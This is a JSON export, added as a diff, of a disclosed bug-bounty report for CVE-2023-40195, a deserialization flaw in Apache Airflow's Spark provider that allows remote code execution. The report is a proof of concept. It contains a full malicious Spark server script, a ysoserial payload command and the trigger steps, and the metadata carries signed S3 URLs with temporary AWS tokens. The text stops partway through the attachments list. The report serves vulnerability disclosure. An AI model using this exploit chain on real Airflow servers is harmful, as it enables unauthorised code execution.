@@ -1,0 +1,254 @@
+{
+  "id": 2127968,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTI3OTY4",
+  "url": "https://hackerone.com/reports/2127968",
+  "title": "CVE-2023-40195: Apache Airflow Spark Provider Deserialization Vulnerability RCE",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2023-08-29T17:31:46.615Z",
+  "submitted_at": "2023-08-29T17:31:46.778Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "x_h1",
+    "url": "/x_h1",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/cmd0k1so2lnpokq93ls8i0puczkx/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 54349,
+    "url": "https://hackerone.com/ibb",
+    "handle": "ibb",
+    "profile_picture_urls": {
+      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYZJN66OK%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T133735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDjc%2B69FzlLwmf4P38M9yVHW02F1ZuaqeMH1WUUGYpJnAiBuR13c%2FRIyp3R8juUb4EiJy5Z47WJhEQg45WZJi7h4jyq6BQib%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMSWb09CFw%2B%2FLMB1ckKo4FJOJFbWTSTdr9Z1wWXU86irE%2BpCp%2FFpfUZDLv0E%2F5r4WKT0%2BJ5HUnPuXCG%2Fqhy68nlpeQxDXS3OSxoMTE5A3UY1qUHuzg5vBxl1FQAg5j0Z0MIqpaCOTcGfvgRNB4hqd8XZMb3%2BPz86%2BLcet0DBsYHrOZUOXns10OBw0J0TemBRJeeRkGvVa4kqahPw1%2Fvr3cBV6skMx2eO32V8XfKjkaQc1w7F%2BKvmW1CN2jtxPY1bVExt6ay5AY6wehBCO16TO5%2FaLjg8LIzVt8Sc%2F61hDOQFgBYY%2FlDhQ9pbFjT%2B9IipEpDYH2eqZHIXjIKUmYOxLEggF9YEL%2F2hFMIrWbCKdvVGu9%2BgUooWcHqsx1LUfNDKg9cX2kHngsO8uEDagUweCW53ip9pMpgcMEavUW6Y3HC7XPPL3ENJ1AuTBoXZvA7vSPxopQbGFyAwbsLuuF59zXwt1VVvqQyOrc2IMc9Z%2F892%2Fq4ZTQvbuPZvjiL03upNL%2BNUmapK2U208wHbtj5xCmIfOTZETCbdS%2FiwrQp2vgJWxRxFjXUfADxKKXZfy2bwGMBFt6Kdgpd%2BMs3xeK4awCFGHhma0ngpsSic8y1lZZvhOf1fP%2F1exTyqRs%2BHOdSEQAyPiUHWj%2FmKs6Z5ypwCTJq%2FSK6vteDMgwdyjbcOyC8vaAVBP8xRjHjcOaIx5ceabqg4vdsMX9J7nEPx%2FBuaKdGTajnXt8xTqtw3jlTLHIqc8YioyIDFUa0Bf6ybu41q8mP5mQS2G11ubNR6jfPN%2Bdy5G%2FSN9Nm4sBzAI2fOybhyYAzkRUwRAcAtU1skEh%2BVpbnbMB4I5WZ9zhXZYRXcO%2FnhuCCx0bFrJskhdSVAXoUNCYmQSv%2FTkiQJy4FDrMMN6KldEGOrIBSjuvVRysqLPnhKxGYSPrivaMG1jVgSn59XjM2J%2FvXyWCF%2FBdjCw1oh%2Ba9MI36zUPt%2ByHYLorBDP%2FNuJ3VOJ%2B4CQabGvstoJD5YQlWhGdb11%2FpUTutllVjq7l9gKyzcA7YFRPIcgyRjl5d%2BwC34hZBr295OSS0O8xibrJwo1MCL5kwG8MHI22A7ICAAdh%2FyxUSPU8PYz93ybsPWhrFoxS0d4O17IIrn5U9K8MkSwOQBa7wA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d59c37fe03aa626c46723275a2dfeeb68c9f900f1e08f29417e2639a5e9d42b5",
+      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYZJN66OK%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T133735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDjc%2B69FzlLwmf4P38M9yVHW02F1ZuaqeMH1WUUGYpJnAiBuR13c%2FRIyp3R8juUb4EiJy5Z47WJhEQg45WZJi7h4jyq6BQib%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMSWb09CFw%2B%2FLMB1ckKo4FJOJFbWTSTdr9Z1wWXU86irE%2BpCp%2FFpfUZDLv0E%2F5r4WKT0%2BJ5HUnPuXCG%2Fqhy68nlpeQxDXS3OSxoMTE5A3UY1qUHuzg5vBxl1FQAg5j0Z0MIqpaCOTcGfvgRNB4hqd8XZMb3%2BPz86%2BLcet0DBsYHrOZUOXns10OBw0J0TemBRJeeRkGvVa4kqahPw1%2Fvr3cBV6skMx2eO32V8XfKjkaQc1w7F%2BKvmW1CN2jtxPY1bVExt6ay5AY6wehBCO16TO5%2FaLjg8LIzVt8Sc%2F61hDOQFgBYY%2FlDhQ9pbFjT%2B9IipEpDYH2eqZHIXjIKUmYOxLEggF9YEL%2F2hFMIrWbCKdvVGu9%2BgUooWcHqsx1LUfNDKg9cX2kHngsO8uEDagUweCW53ip9pMpgcMEavUW6Y3HC7XPPL3ENJ1AuTBoXZvA7vSPxopQbGFyAwbsLuuF59zXwt1VVvqQyOrc2IMc9Z%2F892%2Fq4ZTQvbuPZvjiL03upNL%2BNUmapK2U208wHbtj5xCmIfOTZETCbdS%2FiwrQp2vgJWxRxFjXUfADxKKXZfy2bwGMBFt6Kdgpd%2BMs3xeK4awCFGHhma0ngpsSic8y1lZZvhOf1fP%2F1exTyqRs%2BHOdSEQAyPiUHWj%2FmKs6Z5ypwCTJq%2FSK6vteDMgwdyjbcOyC8vaAVBP8xRjHjcOaIx5ceabqg4vdsMX9J7nEPx%2FBuaKdGTajnXt8xTqtw3jlTLHIqc8YioyIDFUa0Bf6ybu41q8mP5mQS2G11ubNR6jfPN%2Bdy5G%2FSN9Nm4sBzAI2fOybhyYAzkRUwRAcAtU1skEh%2BVpbnbMB4I5WZ9zhXZYRXcO%2FnhuCCx0bFrJskhdSVAXoUNCYmQSv%2FTkiQJy4FDrMMN6KldEGOrIBSjuvVRysqLPnhKxGYSPrivaMG1jVgSn59XjM2J%2FvXyWCF%2FBdjCw1oh%2Ba9MI36zUPt%2ByHYLorBDP%2FNuJ3VOJ%2B4CQabGvstoJD5YQlWhGdb11%2FpUTutllVjq7l9gKyzcA7YFRPIcgyRjl5d%2BwC34hZBr295OSS0O8xibrJwo1MCL5kwG8MHI22A7ICAAdh%2FyxUSPU8PYz93ybsPWhrFoxS0d4O17IIrn5U9K8MkSwOQBa7wA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e61fb84bc6b929c5bac7455774aa3085d96d9d628740c8f2551978247034c83e"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Internet Bug Bounty",
+      "twitter_handle": "",
+      "website": "https://www.hackerone.com/internet-bug-bounty",
+      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-40195"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-09-08T13:06:25.448Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-09-08T13:06:22.853Z",
+  "team_member_agreed_on_going_public_at": "2023-09-07T20:06:46.422Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Apache Airflow Spark Provider. After the malicious Spark server address is configured through the connections of the Airflow UI interface, attackers exploit malicious servers to manipulate pyspark clients through malicious deserialization data. So as to implement RCE attack on airflow server.\n\n##Vulnerability principle\uff1a\n\n1. Analyze spark principle: Spark protocol is based on RPC communication. The RPC communication process is a serialization and deserialization process, Therefore, attackers can call arbitrary java methods through deserialization, implement RCE.\n\n2.Spark can attack the server through malicious client deserialization, and can also attack the client through malicious server; In the Airflow scenario, PySpark is used as a client to connect to the Spark Server through Spark Provider. So, an attacker only needs to construct a malicious server to attack Airflow's Spark client.\n\nThe command that triggers deserialization is as follows:\n**spark-submit --master spark://evil_ip:port**\nTherefore, an attacker can configure malicious ip and port through the connections of the Airflow UI. And to execute the above command, then trigger the deserialization operation.\n\n##Vulnerability exploitation process\uff1a\n\n1. Create a new \u2018Spark\u2019 connection is named \u2018spark_default\u2019\uff0cand configure the Port and Host parameter.\nHost: spark://172.31.76.174\nPort: 8888\n\n###172.31.76.174 is malicious spark server address for attackers\n\n\n(F2648714)\n\n{F2648715}\n\n2.Attackers generate malicious deserialized data (exp.der) through the deserialization tool ysoserial. \n**Tool URL: https://github.com/frohoff/ysoserial**\nThe attacker locally executes the following commands\uff1a\n**\"C:\\Program Files\\Java\\jre1.8.0_361\\bin\\java\" -jar ysoserial.jar CommonsCollections4 \"touch /tmp/thisisRCE\" > exp.der**\n#touch /tmp/thisisRCE is malicious commands to be executed on airflow.\n\n{F2648716}\n\n3.The attacker starts the malicious Spark server locally and specifies the malicious deserialized data to be transmitted.\n**python2 evil_spark_server.py 8888 exp.der**\n\n{F2648717}\n\n4. Enter the DAGs menu and start hive_dag task, select \u201cTrigger DAG w/ config\u201d. \nhttp://localhost:8080/trigger?dag_id=example_spark_operator\n\n{F2648718}\n\n4. The final command is as follows:\n\n**spark-submit --master spark://172.31.76.174:8888 --name arrow-spark /tmp/file**\nThrough the log and server view, it can be seen that any command has been executed successfully.\n\n{F2648719}\n\nThe malicious server successfully accepted the request and sent malicious data.\n\n{F2648720}\n\nSuccessfully executed malicious commands on Airflow Worker Server.\n\n{F2648722}\n\n**evil_spark_server.py**\n```\n#!/usr/bin/python\nimport socket\nimport os\nimport sys\nimport struct\n\nfrom SocketServer import BaseRequestHandler, ThreadingTCPServer\n\nclass EchoHandler(BaseRequestHandler):\n    def handle(self):\n        print 'Got connection from %s'%(str(self.client_address))\n        while True:\n            msg = self.request.recv(8192)\n            print msg\n            if not msg:\n                break\n            if len(msg) > 16:\n                print \"Send msg>>>\"\n                self.request.send(build_msg(msg[9:17]))\n\ndef build_msg(request_id):\n    payloadObj = open(sys.argv[2],'rb').read()\n    msg_type = '\\x04'\n    head_length = 21\n    msg = struct.pack('>Q',len(payloadObj) + 21) + msg_type + request_id\n    msg += struct.pack('>I',len(payloadObj)) + payloadObj\n    return msg\nif __name__ == '__main__':\n    if len(sys.argv) < 3:\n        print 'Usage: python %s <port> </path/to/payload>' % os.path.basename(sys.argv[0])\n        sys.exit()\n    serv = ThreadingTCPServer(('0.0.0.0', int(sys.argv[1])), EchoHandler)\n    print \"Server listening on 0.0.0.0:%s\"%(sys.argv[1])\n    serv.serve_forever()\n```\n\n**DAG Demo(example_spark.py):**\n```\nfrom datetime import datetime\n\nfrom airflow.models import DAG\nfrom airflow.providers.apache.spark.operators.spark_jdbc import SparkJDBCOperator\nfrom airflow.providers.apache.spark.operators.spark_sql import SparkSqlOperator\nfrom airflow.providers.apache.spark.operators.spark_submit import SparkSubmitOperator\n\nwith DAG(\n    dag_id='example_spark_operator',\n    schedule_interval=None,\n    start_date=datetime(2021, 1, 1),\n    catchup=False,\n    tags=['example'],\n) as dag:\n    # [START howto_operator_spark_submit]\n    submit_job = SparkSubmitOperator(\n        application=\"/tmp/file\", task_id=\"submit_job\"\n    )\n    # [END howto_operator_spark_submit]\n\n    # [START howto_operator_spark_jdbc]\n    jdbc_to_spark_job = SparkJDBCOperator(\n        cmd_type='jdbc_to_spark',\n        jdbc_table=\"foo\",\n        spark_jars=\"${SPARK_HOME}/jars/postgresql-42.2.12.jar\",\n        jdbc_driver=\"org.postgresql.Driver\",\n        metastore_table=\"bar\",\n        save_mode=\"overwrite\",\n        save_format=\"JSON\",\n        task_id=\"jdbc_to_spark_job\",\n    )\n\n    spark_to_jdbc_job = SparkJDBCOperator(\n        cmd_type='spark_to_jdbc',\n        jdbc_table=\"foo\",\n        spark_jars=\"${SPARK_HOME}/jars/postgresql-42.2.12.jar\",\n        jdbc_driver=\"org.postgresql.Driver\",\n        metastore_table=\"bar\",\n        save_mode=\"append\",\n        task_id=\"spark_to_jdbc_job\",\n    )\n    # [END howto_operator_spark_jdbc]\n\n    # [START howto_operator_spark_sql]\n    sql_job = SparkSqlOperator(sql=\"SELECT * FROM bar\", master=\"local\", task_id=\"sql_job\")\n    # [END howto_operator_spark_sql]\n```\n\n## Impact\n\nRCE",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2648714,
+      "file_name": "image2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nui93soy6cgb2hzy4ps85tffzktp?response-content-disposition=attachment%3B%20filename%3D%22image2.png%22%3B%20filename%2A%3DUTF-8%27%27image2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYZJN66OK%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T133735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDjc%2B69FzlLwmf4P38M9yVHW02F1ZuaqeMH1WUUGYpJnAiBuR13c%2FRIyp3R8juUb4EiJy5Z47WJhEQg45WZJi7h4jyq6BQib%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMSWb09CFw%2B%2FLMB1ckKo4FJOJFbWTSTdr9Z1wWXU86irE%2BpCp%2FFpfUZDLv0E%2F5r4WKT0%2BJ5HUnPuXCG%2Fqhy68nlpeQxDXS3OSxoMTE5A3UY1qUHuzg5vBxl1FQAg5j0Z0MIqpaCOTcGfvgRNB4hqd8XZMb3%2BPz86%2BLcet0DBsYHrOZUOXns10OBw0J0TemBRJeeRkGvVa4kqahPw1%2Fvr3cBV6skMx2eO32V8XfKjkaQc1w7F%2BKvmW1CN2jtxPY1bVExt6ay5AY6wehBCO16TO5%2FaLjg8LIzVt8Sc%2F61hDOQFgBYY%2FlDhQ9pbFjT%2B9IipEpDYH2eqZHIXjIKUmYOxLEggF9YEL%2F2hFMIrWbCKdvVGu9%2BgUooWcHqsx1LUfNDKg9cX2kHngsO8uEDagUweCW53ip9pMpgcMEavUW6Y3HC7XPPL3ENJ1AuTBoXZvA7vSPxopQbGFyAwbsLuuF59zXwt1VVvqQyOrc2IMc9Z%2F892%2Fq4ZTQvbuPZvjiL03upNL%2BNUmapK2U208wHbtj5xCmIfOTZETCbdS%2FiwrQp2vgJWxRxFjXUfADxKKXZfy2bwGMBFt6Kdgpd%2BMs3xeK4awCFGHhma0ngpsSic8y1lZZvhOf1fP%2F1exTyqRs%2BHOdSEQAyPiUHWj%2FmKs6Z5ypwCTJq%2FSK6vteDMgwdyjbcOyC8vaAVBP8xRjHjcOaIx5ceabqg4vdsMX9J7nEPx%2FBuaKdGTajnXt8xTqtw3jlTLHIqc8YioyIDFUa0Bf6ybu41q8mP5mQS2G11ubNR6jfPN%2Bdy5G%2FSN9Nm4sBzAI2fOybhyYAzkRUwRAcAtU1skEh%2BVpbnbMB4I5WZ9zhXZYRXcO%2FnhuCCx0bFrJskhdSVAXoUNCYmQSv%2FTkiQJy4FDrMMN6KldEGOrIBSjuvVRysqLPnhKxGYSPrivaMG1jVgSn59XjM2J%2FvXyWCF%2FBdjCw1oh%2Ba9MI36zUPt%2ByHYLorBDP%2FNuJ3VOJ%2B4CQabGvstoJD5YQlWhGdb11%2FpUTutllVjq7l9gKyzcA7YFRPIcgyRjl5d%2BwC34hZBr295OSS0O8xibrJwo1MCL5kwG8MHI22A7ICAAdh%2FyxUSPU8PYz93ybsPWhrFoxS0d4O17IIrn5U9K8MkSwOQBa7wA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e9926f7a1bdcbdb2e468c808404015693243f5e9ed76a9a2789517a3063120d9",
+      "file_size": 4365,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2648715,
+      "file_name": "image1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/17k9ahyq3whvltzkq6zy8iwlmly4?response-content-disposition=attachment%3B%20filename%3D%22image1.png%22%3B%20filename%2A%3DUTF-8%27%27image1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYZJN66OK%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T133735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDjc%2B69FzlLwmf4P38M9yVHW02F1ZuaqeMH1WUUGYpJnAiBuR13c%2FRIyp3R8juUb4EiJy5Z47WJhEQg45WZJi7h4jyq6BQib%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMSWb09CFw%2B%2FLMB1ckKo4FJOJFbWTSTdr9Z1wWXU86irE%2BpCp%2FFpfUZDLv0E%2F5r4WKT0%2BJ5HUnPuXCG%2Fqhy68nlpeQxDXS3OSxoMTE5A3UY1qUHuzg5vBxl1FQAg5j0Z0MIqpaCOTcGfvgRNB4hqd8XZMb3%2BPz86%2BLcet0DBsYHrOZUOXns10OBw0J0TemBRJeeRkGvVa4kqahPw1%2Fvr3cBV6skMx2eO32V8XfKjkaQc1w7F%2BKvmW1CN2jtxPY1bVExt6ay5AY6wehBCO16TO5%2FaLjg8LIzVt8Sc%2F61hDOQFgBYY%2FlDhQ9pbFjT%2B9IipEpDYH2eqZHIXjIKUmYOxLEggF9YEL%2F2hFMIrWbCKdvVGu9%2BgUooWcHqsx1LUfNDKg9cX2kHngsO8uEDagUweCW53ip9pMpgcMEavUW6Y3HC7XPPL3ENJ1AuTBoXZvA7vSPxopQbGFyAwbsLuuF59zXwt1VVvqQyOrc2IMc9Z%2F892%2Fq4ZTQvbuPZvjiL03upNL%2BNUmapK2U208wHbtj5xCmIfOTZETCbdS%2FiwrQp2vgJWxRxFjXUfADxKKXZfy2bwGMBFt6Kdgpd%2BMs3xeK4awCFGHhma0ngpsSic8y1lZZvhOf1fP%2F1exTyqRs%2BHOdSEQAyPiUHWj%2FmKs6Z5ypwCTJq%2FSK6vteDMgwdyjbcOyC8vaAVBP8xRjHjcOaIx5ceabqg4vdsMX9J7nEPx%2FBuaKdGTajnXt8xTqtw3jlTLHIqc8YioyIDFUa0Bf6ybu41q8mP5mQS2G11ubNR6jfPN%2Bdy5G%2FSN9Nm4sBzAI2fOybhyYAzkRUwRAcAtU1skEh%2BVpbnbMB4I5WZ9zhXZYRXcO%2FnhuCCx0bFrJskhdSVAXoUNCYmQSv%2FTkiQJy4FDrMMN6KldEGOrIBSjuvVRysqLPnhKxGYSPrivaMG1jVgSn59XjM2J%2FvXyWCF%2FBdjCw1oh%2Ba9MI36zUPt%2ByHYLorBDP%2FNuJ3VOJ%2B4CQabGvstoJD5YQlWhGdb11%2FpUTutllVjq7l9gKyzcA7YFRPIcgyRjl5d%2BwC34hZBr295OSS0O8xibrJwo1MCL5kwG8MHI22A7ICAAdh%2FyxUSPU8PYz93ybsPWhrFoxS0d4O17IIrn5U9K8MkSwOQBa7wA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e51fafae1fb438ba79ed7ed222a97697567edd7f6ddef65fba37a44f59bf6cf2",
+      "file_size": 20878,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2648716,
+      "file_name": "image3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cfzjl2004dzncpsrpljcbnq529wx?response-content-disposition=attachment%3B%20filename%3D%22image3.png%22%3B%20filename%2A%3DUTF-8%27%27image3.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYZJN66OK%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T133735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDjc%2B69FzlLwmf4P38M9yVHW02F1ZuaqeMH1WUUGYpJnAiBuR13c%2FRIyp3R8juUb4EiJy5Z47WJhEQg45WZJi7h4jyq6BQib%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMSWb09CFw%2B%2FLMB1ckKo4FJOJFbWTSTdr9Z1wWXU86irE%2BpCp%2FFpfUZDLv0E%2F5r4WKT0%2BJ5HUnPuXCG%2Fqhy68nlpeQxDXS3OSxoMTE5A3UY1qUHuzg5vBxl1FQAg5j0Z0MIqpaCOTcGfvgRNB4hqd8XZMb3%2BPz86%2BLcet0DBsYHrOZUOXns10OBw0J0TemBRJeeRkGvVa4kqahPw1%2Fvr3cBV6skMx2eO32V8XfKjkaQc1w7F%2BKvmW1CN2jtxPY1bVExt6ay5AY6wehBCO16TO5%2FaLjg8LIzVt8Sc%2F61hDOQFgBYY%2FlDhQ9pbFjT%2B9IipEpDYH2eqZHIXjIKUmYOxLEggF9YEL%2F2hFMIrWbCKdvVGu9%2BgUooWcHqsx1LUfNDKg9cX2kHngsO8uEDagUweCW53ip9pMpgcMEavUW6Y3HC7XPPL3ENJ1AuTBoXZvA7vSPxopQbGFyAwbsLuuF59zXwt1VVvqQyOrc2IMc9Z%2F892%2Fq4ZTQvbuPZvjiL03upNL%2BNUmapK2U208wHbtj5xCmIfOTZETCbdS%2FiwrQp2vgJWxRxFjXUfADxKKXZfy2bwGMBFt6Kdgpd%2BMs3xeK4awCFGHhma0ngpsSic8y1lZZvhOf1fP%2F1exTyqRs%2BHOdSEQAyPiUHWj%2FmKs6Z5ypwCTJq%2FSK6vteDMgwdyjbcOyC8vaAVBP8xRjHjcOaIx5ceabqg4vdsMX9J7nEPx%2FBuaKdGTajnXt8xTqtw3jlTLHIqc8YioyIDFUa0Bf6ybu41q8mP5mQS2G11ubNR6jfPN%2Bdy5G%2FSN9Nm4sBzAI2fOybhyYAzkRUwRAcAtU1skEh%2BVpbnbMB4I5WZ9zhXZYRXcO%2FnhuCCx0bFrJskhdSVAXoUNCYmQSv%2FTkiQJy4FDrMMN6KldEGOrIBSjuvVRysqLPnhKxGYSPrivaMG1jVgSn59XjM2J%2FvXyWCF%2FBdjCw1oh%2Ba9MI36zUPt%2ByHYLorBDP%2FNuJ3VOJ%2B4CQabGvstoJD5YQlWhGdb11%2FpUTutllVjq7l9gKyzcA7YFRPIcgyRjl5d%2BwC34hZBr295OSS0O8xibrJwo1MCL5kwG8MHI22A7ICAAdh%2FyxUSPU8PYz93ybsPWhrFoxS0d4O17IIrn5U9K8MkSwOQBa7wA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1e660ec145721574c5c959a370ab3def1696cd96331b9625a76c933c430a1e01",
+      "file_size": 2452,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2648717,
+      "file_name": "image4.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rrxwzo6s4ygbrwzmyajdgyo1hrnc?response-content-disposition=attachment%3B%20filename%3D%22image4.png%22%3B%20filename%2A%3DUTF-8%27%27image4.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYZJN66OK%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T133735Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDjc%2B69FzlLwmf4P38M9yVHW02F1ZuaqeMH1WUUGYpJnAiBuR13c%2FRIyp3R8juUb4EiJy5Z47WJhEQg45WZJi7h4jyq6BQib%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMSWb09CFw%2B%2FLMB1ckKo4FJOJFbWTSTdr9Z1wWXU86irE%2BpCp%2FFpfUZDLv0E%2F5r4WKT0%2BJ5HUnPuXCG%2Fqhy68nlpeQxDXS3OSxoMTE5A3UY1qUHuzg5vBxl1FQAg5j0Z0MIqpaCOTcGfvgRNB4hqd8XZMb3%2BPz86%2BLcet0DBsYHrOZUOXns10OBw0J0TemBRJeeRkGvVa4kqahPw1%2Fvr3cBV6skMx2eO32V8XfKjkaQc1w7F%2BKvmW1CN2jtxPY1bVExt6ay5AY6wehBCO16TO5%2FaLjg8LIzVt8Sc%2F61hDOQFgBYY%2FlDhQ9pbFjT%2B9IipEpDYH2eqZHIXjIKUmYOxLEggF9YEL%2F2hFMIrWbCKdvVGu9%2BgUooWcHqsx1LUfNDKg9cX2kHngsO8uEDagUweCW53ip9pMpgcMEavUW6Y3HC7XPPL3ENJ1AuTBoXZvA7vSPxopQbGFyAwbsLuuF59zXwt1VVvqQyOrc2IMc9Z%2F892%2Fq4ZTQvbuPZvjiL03upNL%2BNUmapK2U208wHbtj5xCmIfOTZETCbdS%2FiwrQp2vgJWxRxFjXUfADxKKXZfy2bwGMBFt6Kdgpd%2BMs3xeK4awCFGHhma0ngpsSic8y1lZZvhOf1fP%2F1exTyqRs%2BHOdSEQAyPiUHWj%2FmKs6Z5ypwCTJq%2FSK6vteDMgwdyjbcOyC8vaAVBP8xRjHjcOaIx5ceabqg4vdsMX9J7nEPx%2FBuaKdGTajnXt8xTqtw3jlTLHIqc8YioyIDFUa0Bf6ybu41q8mP5mQS2G11ubNR6jfPN%2Bdy5G%2FSN9Nm4sBzAI2fOybhyYAzkRUwRAcAtU1skEh%2BVpbnbMB4I5WZ9zhXZYRXcO%2FnhuCCx0bFrJskhdSVAXoUNCYmQSv%2FTkiQJy4FDrMMN6KldEGOrIBSjuvVRysqLPnhKxGYSPrivaMG1jVgSn59XjM2J%2FvXyWCF%2FBdjCw1oh%2Ba9MI36zUPt%2ByHYLorBDP%2FNuJ3VOJ%2B4CQabGvstoJD5YQlWhGdb11%2FpUTutllVjq7l9gKyzcA7YFRPIcgyRjl5d%2BwC34hZBr295OSS0O8xibrJwo1MCL5kwG8MHI22A7ICAAdh%2FyxUSPU8PYz93ybsPWhrFoxS0d4O17IIrn5U9K8MkSwOQBa7wA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d08b9fb92a21cb14167e226dd073c0a9a620e411082072038526cb02cd472a68",
+      "file_size": 2312,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2648718,
+      "file_name": "image5.png",
